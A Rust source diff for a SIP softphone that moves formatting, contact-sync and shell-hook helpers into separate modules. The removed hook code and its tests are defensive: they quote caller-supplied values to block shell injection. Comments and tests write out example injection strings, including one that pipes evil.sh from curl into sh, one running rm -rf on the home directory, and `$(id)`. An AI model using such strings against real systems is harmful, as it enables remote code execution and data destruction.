@@ -10,8 +10,14 @@
 //! what to display and turns button presses into engine calls.
 
 mod calling;
+mod format;
+mod hooks;
 mod lists;
 mod numbers;
+
+pub(crate) use hooks::{run_custom_command, run_hook};
+use format::{call_status, chrono_now_iso, dialable, display_name, registration_status};
+use providers::build_sync_manager;
 mod providers;
 mod settings_ops;
 
@@ -24,10 +30,7 @@ use sipster_core::{
     ThemeChoice,
 };
 
-use sipster_integrations::{
-    CardDavClient, CardDavConfig, FritzConfig, GoogleContactsClient,
-    CallRecord, CallType, RecordSource, SyncManager,
-};
+use sipster_integrations::{CallRecord, CallType, RecordSource, SyncManager};
 
 use crate::calls;
 use crate::contacts;
@@ -583,123 +586,6 @@ impl SipsterApp {
 
 }
 
-/// The dialable number from a SIP URI.
-///
-/// Local records used to store the whole `From` header —
-/// `"Alice" <sip:611@fritz.box>;tag=179BED3B…` — as the number, which made
-/// history unreadable and meant "Call back" dialled a string containing a
-/// dialog tag.
-fn dialable(remote: &str) -> String {
-    sipster_integrations::caller_number(remote).to_string()
-}
-
-/// The display name from a SIP URI, if it carries one worth showing.
-fn display_name(remote: &str) -> Option<String> {
-    let raw = remote.trim();
-    let name = raw.split_once('<').map(|(name, _)| name)?;
-    let name = name.trim().trim_matches('"').trim();
-    (!name.is_empty() && name != sipster_integrations::caller_number(raw))
-        .then(|| name.to_string())
-}
-
-fn registration_status(state: &RegistrationState) -> String {
-    match state {
-        RegistrationState::Unregistered => rust_i18n::t!("not_registered").into(),
-        RegistrationState::Registering => rust_i18n::t!("registering").into(),
-        RegistrationState::Registered => rust_i18n::t!("registered").into(),
-        RegistrationState::Failed(e) => rust_i18n::t!("failed", error = e).into(),
-    }
-}
-
-fn call_status(state: CallState) -> String {
-    match state {
-        CallState::Dialing => rust_i18n::t!("dialing").into(),
-        CallState::Ringing => rust_i18n::t!("ringing").into(),
-        CallState::Active => rust_i18n::t!("active").into(),
-        CallState::Terminated => rust_i18n::t!("terminated").into(),
-    }
-}
-
-fn chrono_now_iso() -> String {
-    let now = std::time::SystemTime::now();
-    let duration = now.duration_since(std::time::UNIX_EPOCH).unwrap_or_default();
-    let secs = duration.as_secs();
-    // Format simple readable timestamp YYYY-MM-DD HH:MM:SS from unix secs
-    let s = secs % 60;
-    let m = (secs / 60) % 60;
-    let h = (secs / 3600) % 24;
-    let days = secs / 86400;
-    // Approximate calendar date
-    let year = 1970 + days / 365;
-    let day_of_year = days % 365;
-    let month = (day_of_year / 30) + 1;
-    let day = (day_of_year % 30) + 1;
-    format!("{year:04}-{month:02}-{day:02} {h:02}:{m:02}:{s:02}")
-}
-
-/// Builds the sync manager from a config: every provider the user has
-/// configured, wired up before the first sync starts.
-fn build_sync_manager(config: &Config) -> SyncManager {
-            let mut sm = SyncManager::new();
-            let fb = &config.integration.fritzbox;
-            if fb.enabled {
-                sm.set_fritzbox(Some(FritzConfig {
-                    host: fb.host.clone(),
-                    port: fb.port,
-                    username: fb.username.clone(),
-                        password: fb.password.clone(),
-                        tls: fb.tls,
-                        cert_fingerprint: fb.cert_fingerprint.clone(),
-                    }));
-            }
-            let g_clients = config
-                .integration
-                .google_accounts
-                .iter()
-                .filter(|a| a.enabled)
-                .map(|a| {
-                    GoogleContactsClient::new(
-                        a.id.clone(),
-                        a.email.clone(),
-                        a.refresh_token.clone(),
-                        a.client_id.clone(),
-                        a.client_secret.clone(),
-                    )
-                })
-                .collect();
-            sm.set_google_accounts(g_clients);
-
-            let c_clients = config
-                .integration
-                .carddav_accounts
-                .iter()
-                .filter(|a| a.enabled)
-                .map(|a| {
-                    CardDavClient::new(CardDavConfig {
-                        url: a.url.clone(),
-                        username: a.username.clone(),
-                        password: a.password.clone(),
-                    })
-                })
-                .collect();
-            sm.set_carddav_accounts(c_clients);
-
-            sm.set_eds(config.integration.eds_enabled);
-            // The local vCard folder, configured or auto-detected.
-            if config.integration.vdir_enabled {
-                sm.set_vdir(
-                    config
-                        .integration
-                        .vdir_path
-                        .clone()
-                        .map_or_else(sipster_integrations::VdirStore::discover, |path| {
-                            vec![sipster_integrations::VdirStore::new(path)]
-                        }),
-                );
-            }
-            sm
-}
-
 /// Puts the keyboard caret in the dial field.
 ///
 /// iced 0.14 keeps this on `widget::operation` rather than on `text_input`;
@@ -727,111 +613,5 @@ impl SipsterApp {
             return self.handle_ipc(cmd);
         }
         Task::none()
-    }
-}
-
-/// Runs a configured hook that takes no values from the network.
-///
-/// The template comes from the config file, which the user wrote, so it is
-/// theirs to run as they please.
-pub(super) fn run_custom_command(cmd: &str) -> std::io::Result<()> {
-    run_hook(cmd, &[])
-}
-
-/// Runs a configured hook, substituting `{name}`-style placeholders.
-///
-/// # Why the values are quoted
-///
-/// `vars` carry things that arrived over SIP — a caller's display name, a
-/// number, a registrar's reason phrase. Substituting those into a string that
-/// is then handed to `sh -c` is remote code execution: a caller who sets their
-/// display name to `'; curl evil.sh | sh; '` gets a shell on the machine of
-/// anyone with an `on_call_incoming` hook. Nothing about the SIP `From` header
-/// is trustworthy; it is whatever the far end chose to send.
-///
-/// So every substituted value is quoted such that the shell can only ever read
-/// it as one literal word, and the same values are exported as `SIPSTER_*` so a
-/// hook can avoid interpolation altogether.
-pub(super) fn run_hook(template: &str, vars: &[(&str, &str)]) -> std::io::Result<()> {
-    if template.trim().is_empty() {
-        return Ok(());
-    }
-
-    let mut cmd = template.to_string();
-    for (key, value) in vars {
-        cmd = cmd.replace(&format!("{{{key}}}"), &shell_quote(value));
-    }
-
-    #[cfg(target_os = "windows")]
-    let (shell, arg) = ("cmd", "/C");
-    #[cfg(not(target_os = "windows"))]
-    let (shell, arg) = ("sh", "-c");
-
-    let mut command = std::process::Command::new(shell);
-    command
-        .arg(arg)
-        .arg(&cmd)
-        .stdout(std::process::Stdio::null())
-        .stderr(std::process::Stdio::null());
-
-    for (key, value) in vars {
-        command.env(format!("SIPSTER_{}", key.to_uppercase()), value);
-    }
-
-    command.spawn()?;
-    Ok(())
-}
-
-/// Renders `value` so a shell reads it as exactly one literal word.
-///
-/// POSIX single quotes protect everything except a single quote itself, which
-/// is spliced back in the usual way: `'` becomes `'\''`.
-#[cfg(not(target_os = "windows"))]
-fn shell_quote(value: &str) -> String {
-    format!("'{}'", value.replace('\'', r"'\''"))
-}
-
-/// `cmd.exe` has no quoting that survives its own re-parsing — `%VAR%` is
-/// expanded after quotes are stripped, so no amount of escaping is safe.
-/// Characters that carry meaning are dropped instead of trusted.
-#[cfg(target_os = "windows")]
-fn shell_quote(value: &str) -> String {
-    let cleaned: String = value
-        .chars()
-        .filter(|c| !matches!(c, '&' | '|' | '<' | '>' | '^' | '%' | '"' | '\r' | '\n'))
-        .collect();
-    format!("\"{cleaned}\"")
-}
-
-
-
-#[cfg(all(test, not(target_os = "windows")))]
-mod hook_tests {
-    use super::shell_quote;
-
-    /// The values a hook interpolates arrive over SIP or from a contact
-    /// provider. If one of them can close its own quote, a caller who names
-    /// themselves `'; rm -rf ~; '` runs commands on this machine.
-    #[test]
-    fn a_quote_in_a_value_cannot_escape_it() {
-        let quoted = shell_quote("a'b");
-        assert_eq!(quoted, r"'a'\''b'");
-    }
-
-    /// Everything the shell would otherwise act on has to survive as text.
-    #[test]
-    fn shell_metacharacters_stay_literal() {
-        for hostile in ["$(id)", "`id`", "a; id", "a | id", "a && id", "$HOME", "a\nid"] {
-            let quoted = shell_quote(hostile);
-            assert!(quoted.starts_with('\'') && quoted.ends_with('\''), "{quoted}");
-            let inner = &quoted[1..quoted.len() - 1];
-            assert!(!inner.contains('\''), "{quoted} leaves a bare quote");
-        }
-    }
-
-    #[test]
-    fn an_ordinary_value_is_left_readable() {
-        assert_eq!(shell_quote("Alice"), "'Alice'");
-        assert_eq!(shell_quote("**622"), "'**622'");
     }
 }
